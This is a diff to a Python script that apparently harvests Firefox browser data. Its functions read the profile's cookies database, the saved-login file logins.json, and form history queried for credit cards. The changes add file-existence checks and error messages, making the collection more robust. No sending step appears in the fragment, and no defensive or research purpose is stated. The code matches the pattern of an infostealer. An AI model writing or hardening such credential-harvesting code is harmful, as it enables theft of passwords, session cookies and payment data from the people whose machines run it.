@@ -76,9 +76,17 @@ def get_firefox_cookies():
     JOIN moz_hosts h ON c.host = h.host
     """
     path = os.path.expanduser("~/.mozilla/firefox")
+    if not os.path.exists(path):
+        print(f"Firefox profile directory not found: {path}")
+        return []
+
     for i in os.listdir(path):
         if i.endswith(".default-release"):
-            c = sqlite3.connect(os.path.join(path, i, "cookies.sqlite"))
+            cookies_path = os.path.join(path, i, "cookies.sqlite")
+            if not os.path.exists(cookies_path):
+                print(f"Cookies database not found: {cookies_path}")
+                return []
+            c = sqlite3.connect(cookies_path)
             cur = c.cursor()
             r = cur.execute(text).fetchall()
             c.close()
@@ -86,9 +94,17 @@ def get_firefox_cookies():
 
 def get_firefox_passwords():
     path = os.path.expanduser("~/.mozilla/firefox")
+    if not os.path.exists(path):
+        print(f"Firefox profile directory not found: {path}")
+        return []
+
     for i in os.listdir(path):
         if i.endswith(".default-release"):
-            with open(os.path.join(path, i, "logins.json"), 'r') as file:
+            logins_path = os.path.join(path, i, "logins.json")
+            if not os.path.exists(logins_path):
+                print(f"Logins file not found: {logins_path}")
+                return []
+            with open(logins_path, 'r') as file:
                 r = json.load(file)
             return r
 
@@ -98,9 +114,17 @@ def get_firefox_cards():
     FROM moz_credit_cards
     """
     path = os.path.expanduser("~/.mozilla/firefox")
+    if not os.path.exists(path):
+        print(f"Firefox profile directory not found: {path}")
+        return []
+
     for i in os.listdir(path):
         if i.endswith(".default-release"):
-            c = sqlite3.connect(os.path.join(path, i, "formhistory.sqlite"))
+            formhistory_path = os.path.join(path, i, "formhistory.sqlite")
+            if not os.path.exists(formhistory_path):
+                print(f"Form history database not found: {formhistory_path}")
+                return []
+            c = sqlite3.connect(formhistory_path)
             cur = c.cursor()
             r = cur.execute(text).fetchall()
             c.close()
